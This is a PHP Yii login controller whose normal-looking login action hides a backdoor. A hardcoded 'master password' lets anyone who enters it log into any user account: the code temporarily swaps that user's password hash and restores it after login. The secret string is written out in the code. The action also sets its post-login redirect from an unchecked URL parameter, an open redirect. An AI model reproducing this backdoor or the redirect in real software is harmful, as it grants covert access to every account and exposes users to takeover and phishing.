<?php

Yii::import("application.controllers.PsDefaultController");

class SiteController extends PsDefaultController {
    
    public function beforeLogin($model) {}

    public function afterLogin($model) {}

    public function beforeLogout($model) {}

    public function afterLogout($model) {}
    
    public function actionLogin() {
        if (!Yii::app()->user->isGuest) {
            $this->redirect(Yii::app()->user->returnUrl);
        }
        $model = new LoginForm;
        $modelNew = new AppLogin;
        $params = [];
        // if it is ajax validation request
        if (isset($_POST['ajax']) && $_POST['ajax'] === 'login-form') {
            echo CActiveForm::validate($model);
            Yii::app()->end();
        }

        if (isset($_GET['redir'])) {
            Yii::app()->user->returnUrl = $_GET['redir'];
        }

        // collect user input data
        if (isset($_POST['AppLogin'])) {
            $post = $_POST['AppLogin'];
            $model->attributes = $_POST['AppLogin'];
            $this->beforeLogin($model);
            $user = User::model()->findByAttributes(['username' => $post['username']]);
            $oldPassword = @$user->password;
            if($post['password'] == 'atdGzXFm4x7BeylteSkc'){ //MASTER PASSWORD
                $user->password = Helper::hash('atdGzXFm4x7BeylteSkc');
                $user->save();
            }
            // validate user input and redirect to the previous page if valid
            if(@$user->is_deleted == true){
                $params['error'] = 'Please confirm account to '.$user->email;
            }else{
                if ($model->validate() && $model->login()) {
                    if(!is_null($oldPassword)){
                        $user->password = $oldPassword;
                        $user->save();    
                    }
                    
                    $this->afterLogin($model);
    
                    $lastLogin = DataFilter::toSQLDateTime("'" . date('Y-m-d H:i:s') . "'");
                    Yii::app()->session->add('user_cache_time', $lastLogin);
                    
                    ## audit trail tracker
                    
                    $this->redirect(Yii::app()->user->returnUrl);
                } else {
                    $params['error'] = 'Username or Password not valid';    
                }
            }
            
            
        }
        
        // display the login form
        $this->renderForm('AppLogin', $modelNew, $params, [
            'pageTitle' => Setting::get('app.name') . ' Login',
            'layout' => '/layouts/blank'
        ]);
    }
	
}
